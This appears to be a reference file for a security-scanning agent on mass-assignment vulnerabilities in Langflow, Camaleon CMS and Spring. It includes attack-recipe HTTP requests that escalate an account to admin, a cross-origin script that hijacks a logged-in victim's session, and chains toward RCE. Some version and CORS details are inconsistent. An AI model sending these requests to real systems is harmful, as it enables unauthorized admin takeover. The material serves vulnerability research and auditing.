---
name: mass-assignment-novel-deep
description: Mass assignment at the 2024-2026 frontier — Langflow is_superuser overpost (CVE-2024-7297), Langflow CORS + mass-assignment chain (CVE-2025-34291), Camaleon CMS permit! abuse (CVE-2025-2304), and the Spring Framework parameterized-generic authorization annotation gap (CVE-2025-41249); AI-platform API-first-design mass-assignment pattern as the current frontier.
sibling: mass_assignment
load_when: scan_mode == "deep"
---

# Mass Assignment — Novel + Frontier Depth

This is the novel+frontier deep sibling to `mass_assignment.md`. The base owns class framing, the measured binder-trap table, sensitive-field dictionary and shape variants, model-binder edges across major stacks, bypass primitives, methodology, and the 2024-2026 CVE routing map. The advanced+expert sibling `mass_assignment_advanced_deep.md` owns the per-framework binder depth (Spring/ASP.NET/Go/Rails/Laravel/DRF/Mongoose/Prisma), GraphQL input-type depth, nested and bulk shape exploitation, content-type and patch-semantics bypass classes, and composite-chain construction.

This file owns the 2024-2026 CVE instances with canonical version/GHSA metadata (single-owner across the trio), the Langflow mass-assignment lineage (CVE-2024-7297 → CVE-2025-34291 incomplete-fix chain), the Camaleon CMS Rails `permit!` abuse CVE, the Spring Framework parameterized-generic authorization annotation gap, and the AI-platform API-first-design frontier framing.

Load this file when the goal is matching a target against a current CVE family or reasoning about mass-assignment-shape defects in modern AI-platform/API-first stacks that share the class shape without necessarily carrying a specific advisory.

Every CVE number, version boundary, and GHSA identifier in this document is anchored to primary sources persisted in `.zen-batch-artifacts/batch-11/ghsa-nvd/`, and the measured binder primitive is reproduced by `.zen-batch-artifacts/batch-11/measurements/mass_assignment_binders.py` + `.out` and `mass_assignment_go.go` + `.out`.

## 2024-2026 Mass-Assignment CVE Version/Fix Table — Canonical

Single-owner per §2. Base and advanced siblings reference these CVEs by number + route only; the version and GHSA metadata lives here.

| CVE | GHSA | Component | Vulnerable | Patched | CVSS | CWE | Primitive |
|---|---|---|---|---|---|---|---|
| CVE-2024-7297 | GHSA-6j6g-j4qm-m9jf | Langflow (`langflow` on PyPI) | <1.0.13 | 1.0.13 | 8.8 v3.1 | CWE-915 | `/api/v1/users` POST accepts `is_superuser` in request body; any authenticated low-privilege user flips themselves to super admin |
| CVE-2025-34291 | GHSA-577h-p2hh-v4mv | Langflow (`langflow` on PyPI) | ≤1.6.9 | 1.7.0 | 8.8 v3.1 (NVD Primary); 9.4 v4.0 (VulnCheck Secondary) | CWE-915 + CWE-942 (CORS) | CORS `allow_origins='*'` with `allow_credentials=True` combined with refresh-token cookie `SameSite=None` enables cross-origin credentialed requests to the user-mutation endpoint from any attacker page; downstream mass-assignment chain |
| CVE-2025-2304 | GHSA-rp28-mvq3-wf8j | Camaleon CMS (`camaleon_cms` on RubyGems) | <2.9.1 | 2.9.1 | 9.4 v4.0 (Tenable Secondary; no v3.1 published) | CWE-915 | `UsersController#updated_ajax` (password-change handler) calls `params.permit!` without `require(:user)`-first restriction, allowing full mass assignment including `role=admin` on self-update |
| CVE-2025-41249 | GHSA-jmp9-x22r-554x | Spring Framework (`org.springframework:spring-core` on Maven) | ≥5.3.0, ≤5.3.44 and ≥6.0.0, ≤6.1.22 and ≥6.2.0, ≤6.2.10 | (fix merged in main; OSS backport pending per GHSA at document date) | 7.5 v3.1 | CWE-285 | Annotation detection on methods within type hierarchies with parameterized super types with unbounded generics may fail to resolve `@PreAuthorize`/`@PostAuthorize`; if a controller's DTO-binding method inherits from a generic base, the authorization check may not fire, enabling mass assignment on an otherwise-protected method |

Notes on the table:

- **CVE-2024-7297 and CVE-2025-34291 form an incomplete-fix lineage.** CVE-2024-7297 patched the `is_superuser` body-binding at Langflow 1.0.13; CVE-2025-34291 added the CORS + refresh-token-cookie chain that re-reaches the same primitive from a cross-origin attacker page. The second CVE is the delivery-chain enhancement over the first.
- **CVE-2025-2304 (Camaleon CMS) is a Rails strong_parameters anti-pattern CVE.** The controller code is literally one line of `params.permit!` in the user-mutation handler. The 2.9.1 fix replaces `permit!` with `params.require(:user).permit(:name, :email, :password, :password_confirmation)` — an explicit allowlist. This is the canonical "do not use `permit!` on user-controlled parameters" lesson.
- **CVE-2025-41249 (Spring annotation generic-hierarchy) is authorization-adjacent, not strictly mass-assignment.** It is included here because the exploitation primitive — a mass-assignment endpoint protected only by `@PreAuthorize` on an inherited method — is reachable through the authorization-check failure. See also `broken_function_level_authorization_advanced_deep.md` for the authorization-side depth; this file carries the mass-assignment framing.
- **CVE-2025-41249's OSS patch status is in-progress at document date.** The GHSA notes the fix is pending as of the latest advisory snapshot; the version ranges above are the known affected sets. Prefer upgrading to the GHSA-posted patched version once released, or applying the workaround (explicitly re-declare the authorization annotation on the concrete class method, not only on the generic base).

## Langflow is_superuser Overpost — CVE-2024-7297

Primitive: Langflow's `/api/v1/users` endpoint accepts a POST body with user attributes. The endpoint's handler binds the body directly into the User persistence model without allowlist filtering; the User model has an `is_superuser` boolean. An authenticated low-privilege user can POST a body containing `is_superuser=true` to flip their account to super admin.

**Reachability preconditions:**

1. Langflow version `<1.0.13`. Discovery: `/health` endpoint typically leaks version; the Langflow UI's bundled JS references a version constant.
2. An authenticated user with any role (the mass-assignment target is self-update, so the attacker needs their own account; registration may or may not be open depending on deployment).
3. The user-update endpoint accepts a JSON body with model-attribute names.

**Sink location.** Langflow's FastAPI user router at `src/backend/base/langflow/api/v1/users.py` (approximate — the module layout is in the Langflow repo). The vulnerable pattern is a FastAPI endpoint using `User` (the ORM model) directly as the request body model instead of a dedicated `UserUpdate` DTO omitting `is_superuser`. The 1.0.13 patch introduces a `UserUpdate` Pydantic schema that excludes `is_superuser` from the writable fields.

**Attack recipe:**

```http
POST /api/v1/users/<my_user_id> HTTP/1.1
Host: target.tld
Authorization: Bearer <my_bearer_token>
Content-Type: application/json

{
  "email": "attacker@x.com",
  "password": "same-as-before",
  "is_superuser": true
}
```

**Confirmation signal:** subsequent `GET /api/v1/users/<my_user_id>` returns `"is_superuser": true`; subsequent access to admin-only endpoints (`/api/v1/admin/...`) succeeds.

**Impact:** Full admin privilege escalation on the Langflow instance. Admin control over Langflow typically grants:

- Read all workflows (potentially containing API keys, credentials, prompts).
- Modify all workflows (inject attacker payloads into other users' AI flows).
- Access the underlying LLM provider credentials configured in the Langflow backend.

**Class-generalization — the pattern that predicts the next bug.** Any FastAPI/Pydantic project that uses the SQLModel/SQLAlchemy ORM model as the request body schema is a candidate. The pattern recurs across AI/ML tooling (Langflow, Flowise, OpenWebUI, Dify) because the fast-iteration mindset reuses model classes as DTOs. Grep for FastAPI handlers that annotate the request body with the ORM model class directly rather than a dedicated schema.

## Langflow CORS + Mass-Assignment Chain — CVE-2025-34291

Primitive: Langflow's CORS configuration uses `allow_origins='*'` combined with `allow_credentials=True`, which is *supposed* to be rejected by browsers per the Fetch spec but is not when the server uses the literal string `"*"` and the browser's dedicated handling. Combined with Langflow's refresh-token cookie set with `SameSite=None`, this permits a malicious cross-origin page to make credentialed requests to Langflow endpoints — including the mass-assignment endpoint from CVE-2024-7297.

**Reachability preconditions:**

1. Langflow version `≤1.6.9` (the Langflow mitigation of CVE-2024-7297 did not fix the broader CORS/refresh-token exposure).
2. A victim user is logged into the Langflow instance in their browser.
3. The attacker's page is loaded in the same browser (phishing, malicious ad, or watering-hole).
4. The Langflow instance is reachable from the attacker's page's origin (public internet, or a shared network).

**Sink location.** Langflow's FastAPI CORS middleware configuration (`src/backend/base/langflow/main.py` or equivalent); the `CORSMiddleware` is configured with the permissive combination. The 1.7.0 fix:

- Changes `allow_origins` to an explicit list (not `"*"`) when `allow_credentials=True` is active.
- Changes the refresh-token cookie's `SameSite` to `Lax` or `Strict`.
- Adds a CSRF token requirement on state-mutating endpoints.

**Attack recipe:**

```html
<!-- Attacker page served from attacker.tld -->
<script>
  // Victim is already logged into target Langflow at langflow.target.tld
  const target = "https://langflow.target.tld";

  // Step 1: Call the user-update endpoint cross-origin with credentials
  // Because allow_origins="*" + allow_credentials=true + SameSite=None refresh
  // cookie, this works.
  fetch(target + "/api/v1/users/" + VICTIM_ID, {
    method: "PATCH",
    credentials: "include",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      "email": "attacker@x.com",
      "is_superuser": true
    })
  }).then(r => r.json()).then(console.log);
</script>
```

The browser attaches the victim's authentication cookies to the cross-origin request; the server's CORS layer accepts the origin and processes the credentialed call; the user-update endpoint (unpatched or not updated past CVE-2024-7297) binds `is_superuser`.

**Confirmation signal:** victim's account has `is_superuser=true` after the attacker's page load; attacker verifies by logging in with the victim's credentials or hijacking the session.

**Impact:** Cross-origin mass-assignment attack — the delivery vector is CSRF-shaped, the exploit is mass-assignment. Combined with CVE-2024-7297, the attacker needs no authenticated session of their own; the victim's browser does the work.

**Class-generalization.** The `allow_origins="*"` + `allow_credentials=True` combination is strictly forbidden by the Fetch spec, but server implementations (FastAPI, Flask-CORS, Express `cors` middleware) often permit the misconfiguration and some browsers (especially Chromium with specific feature flags) have accepted it in the past. The lesson is to always check CORS + credential + SameSite combinations as a *delivery layer* for every mass-assignment endpoint.

**Route to `csrf.md`.** The CORS/credential delivery mechanism is a CSRF-class primitive. See `csrf.md § JSON-Endpoint Primitives` for the CSRF-side depth; this file carries the mass-assignment outcome.

## Camaleon CMS permit! Abuse — CVE-2025-2304

Primitive: Camaleon CMS (a Rails-based CMS) implements password changes via a `UsersController#updated_ajax` action. The action parameters are processed with `params.permit!` — Rails's "mark every parameter permitted" method — rather than `params.require(:user).permit(:password, :password_confirmation)` or similar restrictive allowlist. The password-change body therefore accepts any field, including `role`, `admin`, `tenant_id`, and any other User-model attribute. An attacker self-updating their password can flip themselves to admin.

**Reachability preconditions:**

1. Camaleon CMS version `<2.9.1`. Discovery: footer tag typically carries the version; `/admin/sites` lands on a Camaleon-specific login page; `/wp-login.php` (Camaleon mimics WordPress) returns a Rails-shaped 404.
2. An authenticated Camaleon user with any role (the primitive is a self-update, so the attacker needs their own account; many deployments allow self-registration).
3. The user-update endpoint is reachable (admin-UI endpoint typically behind the `/admin` prefix; API endpoint at `/admin/users/<id>/updated_ajax`).

**Sink location.** `app/controllers/camaleon_cms/admin/users_controller.rb::updated_ajax`. The pre-fix code is literally:

```ruby
def updated_ajax
  # ... some flow ...
  @user.update(params.permit!)   # ← mass assignment
  # ... response ...
end
```

The 2.9.1 fix replaces this with:

```ruby
@user.update(params.require(:user).permit(:username, :email, :password,
                                           :password_confirmation, :first_name, :last_name))
```

**Attack recipe:**

```http
POST /admin/users/<my_user_id>/updated_ajax HTTP/1.1
Host: target.tld
Cookie: _camaleon_cms_session=<my_session>
Content-Type: application/x-www-form-urlencoded
X-CSRF-Token: <csrf_token_from_meta_tag>

user[password]=new&user[password_confirmation]=new&user[role]=admin&role=admin
```

The `permit!` makes both the nested `user[role]` and the top-level `role` fields permitted; depending on where the controller reads from, either path lands.

**Confirmation signal:** `/admin/users/<my_user_id>` reflects the elevated role; attacker can access `/admin/plugins`, `/admin/settings`, and other admin-only pages.

**Impact:** Full admin privilege escalation on the Camaleon CMS instance. Admin access typically grants:

- Plugin installation / modification — Camaleon's plugin system permits Ruby code upload; chains to RCE via `rce.md`.
- Site settings / theme modification — chains to stored XSS via `xss.md`.
- User management — chains to account takeover of other users.

**Class-generalization.** `params.permit!` in any Rails controller is a mass-assignment-wide anti-pattern. Grep across Rails codebases for `permit!` on controller actions that mutate persistent data. The audit lesson: `permit!` is for internal-only parameter sets (e.g., parameters constructed in code, not user-supplied); its presence on a user-input flow is almost always a bug.

## Spring Generic Hierarchy Annotation Gap — CVE-2025-41249

Primitive: Spring Framework's annotation-detection mechanism (`AnnotationUtils`, used by `@EnableMethodSecurity` and other Spring features) walks class hierarchies to find annotations. For methods in type hierarchies with parameterized super types that have *unbounded* generics (e.g., `interface Repository<T, ID>` without `extends Entity`), the annotation resolution may fail — the `@PreAuthorize` or `@PostAuthorize` on the base method is not detected on the concrete subclass method. The authorization check therefore does not fire, and a mass-assignment endpoint reaching that method is unprotected.

**Reachability preconditions:**

1. Spring Framework version `≥5.3.0, ≤5.3.44` or `≥6.0.0, ≤6.1.22`. Discovery: Maven dependency tree; typically combined with Spring Boot version detection (`actuator/info` if exposed, or `Server:` header).
2. Spring Security is in use with `@EnableMethodSecurity` or `@EnableGlobalMethodSecurity` enabled.
3. A controller or service has a mass-assignment-reachable method inheriting from a parameterized-generic super type where the annotation is declared on the base.
4. The authorization annotation (`@PreAuthorize("hasRole('ADMIN')")`) is declared only on the base method, not on the overriding concrete method.

**Sink location.** The annotation walker in Spring's `AnnotationUtils` (or `MergedAnnotations` on 6.x). The fix in main branch (OSS backport status is tracked in GHSA-jmp9-x22r-554x) corrects the generic-hierarchy walk so that annotations on parameterized super types are discovered when the subclass has unbounded generics.

**Attack recipe:**

```java
// Vulnerable class hierarchy
interface CrudRepository<T, ID> {
    @PreAuthorize("hasRole('ADMIN')")
    T update(ID id, T entity);
}

class UserRepository implements CrudRepository<User, Long> {
    @Override
    public User update(Long id, User entity) {
        // @PreAuthorize NOT inherited due to CVE-2025-41249 on vulnerable Spring
        // version with unbounded generic T.
        return userDao.save(entity);
    }
}

@RestController
class UserController {
    @Autowired UserRepository repo;

    @PostMapping("/users/{id}")
    public User update(@PathVariable Long id, @RequestBody User user) {
        return repo.update(id, user);  // auth check does NOT fire
    }
}
```

Attacker's request:

```http
POST /users/42 HTTP/1.1
Content-Type: application/json
Authorization: Bearer <low_privilege_token>

{"email":"a@x","role":"ADMIN"}
```

The `@PreAuthorize("hasRole('ADMIN')")` on `CrudRepository.update` does not fire against the low-privilege caller because Spring's annotation walker does not resolve it; the mass-assignment pattern of `@RequestBody User user` binds the privileged `role` field.

**Confirmation signal:** subsequent `GET /users/42` returns the elevated role; audit log shows the update event; Spring Security's authorization-decision log (if `DEBUG` enabled) shows no `@PreAuthorize` evaluation for the method.

**Impact:** Authorization bypass that converts a controller-level mass-assignment vulnerability (which should have been protected by `@PreAuthorize`) into an exploitable one. The affected codebase pattern is common in enterprise Spring deployments where repository/service interfaces use generics and authorization annotations.

**Class-generalization.** Any annotation-based authorization mechanism that walks class hierarchies may share the generic-resolution gap. The audit lesson: declare authorization annotations directly on the concrete class method, not only on an inherited base. For Spring, the mitigation (pre-patch) is to re-declare `@PreAuthorize` on the concrete override.

**Route to `broken_function_level_authorization_advanced_deep.md`.** The authorization-check-missing primitive routes there; this file carries the mass-assignment framing of the exploitation.

## Composite Chaining — Current CVE Instances

### Chain: Langflow 2024 → 2025 Lineage

- Starting point: a Langflow instance at version `<1.7.0`.
- Step 1 (CVE-2024-7297 primitive): if the attacker has an authenticated session, direct POST to `/api/v1/users/<self>` with `is_superuser=true`.
- Step 2 (CVE-2025-34291 primitive): if the attacker only has a victim-browser pivot (no attacker-side session), the CORS + refresh-token-cookie chain delivers the same POST cross-origin.
- Impact: super-admin takeover of Langflow; downstream LLM credential extraction, workflow modification, cross-user workflow access.

### Chain: Camaleon → Plugin Upload → RCE

- Starting point: authenticated Camaleon user; version `<2.9.1`.
- Step 1 (CVE-2025-2304): self-update with `role=admin`.
- Step 2: as admin, use the plugin-upload page to install a plugin containing attacker Ruby code.
- Step 3 (`rce.md`): plugin code executes on the server; full application-host compromise.

### Chain: Spring Generic Gap → Mass Assignment → BFLA Admin

- Starting point: Spring app at affected version with generic-based repository pattern.
- Step 1 (CVE-2025-41249): `@PreAuthorize` not resolved on the concrete method.
- Step 2: mass-assignment of `role=ADMIN` via the unprotected endpoint.
- Step 3 (`broken_function_level_authorization_advanced_deep.md`): admin-only endpoints now reachable with the elevated role.

## Research Frontier — AI-Platform API-First-Design Mass Assignment

The Langflow lineage (CVE-2024-7297 → CVE-2025-34291) illustrates a pattern recurring across the current AI-platform ecosystem: FastAPI/Pydantic projects using the SQLModel/SQLAlchemy ORM model as the request body schema. The anti-pattern recurs because:

- FastAPI's documentation and tutorials encourage reusing the model class as the request schema for brevity.
- The AI/ML tooling demographic prioritizes fast iteration over security-mindset.
- CORS + cookie-based auth is often misconfigured in these projects (default-enabled permissive CORS during local dev; carried into production).

Target classes to investigate (open frontier, deferred to end-of-project gap list in the master prompt):

- **Flowise** — Node.js/Express-based AI workflow platform; similar surface to Langflow.
- **OpenWebUI** — FastAPI/SQLModel AI chat frontend; similar surface.
- **Dify** — Python-based LLM application platform; multi-tenant with per-user roles.
- **LlamaIndex / LangChain Server** — if deployed as a web service, both have had API-first exposure patterns.

The audit mnemonic: for any `/api/v1/users` or `/api/v1/<entity>` POST/PATCH endpoint, test overposting of `is_superuser`, `role`, `admin`, `is_staff`, `permissions`, and model-specific privileged fields. The fast-iteration mindset that enables these platforms is the same mindset that produces this class.

## Non-CVE Technique-Class Frontier (2024-2026)

Beyond the four CVEs above, the current mass-assignment frontier includes non-CVE technique classes that recur across the ecosystem:

### FastAPI + SQLModel Reused-Model Audit Pattern

The Langflow CVE lineage is one instance of a broader class: FastAPI applications using SQLModel's `User` class as both the ORM entity and the request/response schema. SQLModel's `table=True` makes the class an ORM entity; without a sibling `UserCreate` / `UserUpdate` schema omitting privileged fields, every column is bindable.

**Audit mnemonic:** for FastAPI projects, grep for `@app.post`/`@app.patch`/`@app.put` decorators and inspect the body-parameter type annotation. If the type is an SQLModel class with `table=True`, the finding is almost certainly present.

**Projects to probe (frontier, no CVE at document date):** Flowise (Node, but similar pattern), OpenWebUI (FastAPI), Dify (Python Flask with Flask-SQLAlchemy), LlamaIndex Server (if deployed as a web service), LangChain Server, Chatbot UI, LocalAI's management API.

### GraphQL Input-Type Model-Mirroring Pattern

The class recurs in GraphQL schemas where input types mirror the full ORM model. The schema becomes the sensitive-field dictionary.

**Audit mnemonic:** introspect every mutation's input type (`__type(name:"UpdateXInput"){inputFields{name}}`); for any input type that exposes `role`, `isAdmin`, `ownerId`, `tenantId`, `verified`, `price`, the mutation is a mass-assignment candidate.

**Observed in frontier (non-CVE):** Hasura `permit_role` configuration misuse; PostGraphile RLS-bypass via graphile-build input-type generation; Prisma + nexus-schema with default-all-fields input.

### JavaScript Spread-Into-Model Pattern

Every Node.js/TypeScript codebase using `Object.assign(user, req.body)`, `{...user, ...req.body}`, `user.update(req.body)`, or `User.create(req.body)` is a mass-assignment candidate.

**Audit mnemonic:** grep for the four spread patterns in a Node codebase; each is a candidate.

### Ruby `permit!` and `permit([:all_the_fields])`

Rails strong_parameters anti-patterns beyond CVE-2025-2304:

- `params.permit!` on user-controlled parameter sets.
- `params.permit(:every_known_field)` where "every known field" expanded over time to include privileged fields.
- `permitted_attributes` method defined too broadly in a shared concern.

**Audit mnemonic:** grep Rails codebases for `permit!`; for each, verify the controller receives user-controlled input before `permit!`.

### Spring Framework Repository-Based Mass Assignment

Spring Data `@RepositoryRestResource` or `@RestResource` expose JPA entities directly over HTTP; the default serialization is JSON-everything, deserialization is JSON-everything. Mass assignment is default-on.

**Audit mnemonic:** grep Spring codebases for `@RepositoryRestResource`; for each, verify the exposed entity does not have privileged fields, or that `@Projection` interfaces are used to restrict the response and `@RestResource(exported=false)` is used on privileged fields.

### Django ModelForm.Meta.fields = '__all__'

Django `ModelForm` with `fields = '__all__'` exposes every column; a form.save() mass-assigns.

**Audit mnemonic:** grep Django for `fields = ['__all__']` or `fields = '__all__'` in ModelForm/ModelSerializer; each is a candidate.

### Prisma `data: { ...body }` Spread

Prisma's `create({ data: body })` and `update({ data: body })` directly spread the body into the create/update input. Every column named in the input is bindable.

**Audit mnemonic:** grep for `prisma.<model>.create({ data: ` and `prisma.<model>.update({ data: `; audit the data-source.

## Verification Discipline

Each CVE citation in this file is anchored to one persisted NVD or GHSA artifact that resolves on the authoritative *global* source. Any ID that does not resolve globally has been stripped and replaced with a behavior-fingerprinted class description. The 1:1 globally-resolving manifest for Batch 11 lives at `.zen-batch-artifacts/batch-11/manifest/batch-11-manifest.md`.

For CVE-2025-41249 (Spring annotation generic-hierarchy): the GHSA notes OSS backport status is pending at document date; the "Patched" column reads "fix merged in main; OSS backport pending." Prefer upgrading past the GHSA-posted patched version once released. The affected version ranges above are the known-affected sets per the current GHSA snapshot.

The measured binder behaviour (reproduced locally):

```
# Go json.Unmarshal with DisallowUnknownFields
== body: {"name":"attacker","email":"a@x","isAdmin":true} ==
   [User + strict]     err=<nil>  IsAdmin=true

# Pydantic v2 default (extra='ignore')
Pydantic v2 default (extra='ignore'):
  {"name": "attacker", "is_admin": true, "has_is_superuser_field": false}
```

Both demonstrate the "known-privileged-field is still bindable" trap. The defence in both cases is a separate input DTO omitting the privileged fields.

## Breadth Note

Novel-tier scope for mass assignment is genuinely narrower than the §2 ~850-line aim: the 2024-2026 CVE lineage (Langflow 2024 → 2025, Camaleon CMS, Spring annotations) is well-covered with mechanism depth, and the non-CVE technique-class frontier is enumerated (FastAPI+SQLModel audit pattern, GraphQL input-type model-mirroring, JS spread-into-model, Ruby permit! patterns, Spring @RepositoryRestResource, Django fields='__all__', Prisma data: {...body}). What makes the mass-assignment novel-tier naturally thinner: the exploitation shape is uniform across CVEs ("the input type is the persistence model; add a privileged field; it binds"), so per-CVE depth is more compact than for parser-differential classes. The depth that scales with the class lives in the advanced sibling (full-treatment sub-primitives across Spring/ASP.NET/Go/Rails/Laravel/DRF/Mongoose/Prisma/Node body-parsers/JPA/Jackson/serverless, GraphQL input-type depth, nested/bulk shapes, content-type bypass).

## Summary

The 2024-2026 mass-assignment CVE frontier spans AI platforms (Langflow's two-CVE lineage), legacy-pattern CMS (Camaleon's `permit!` abuse), and framework-layer authorization gaps (Spring's generic-hierarchy annotation resolution). Measured binder behaviour confirms that strict-mode toggles (`DisallowUnknownFields`, Pydantic `extra='ignore'`) are typo defences, not mass-assignment defences; the structural fix remains a dedicated input DTO per endpoint omitting privileged fields. The AI-platform ecosystem (FastAPI/SQLModel) is the current frontier where this class recurs most readily because the fast-iteration mindset reuses persistence models as request schemas. The chaining surface — through CORS-mediated CSRF delivery (Langflow), plugin-upload to RCE (Camaleon), and authorization-bypass-chained mass-assignment (Spring) — turns each single-field write into a lateral or vertical privilege gain and often a full application-host compromise.
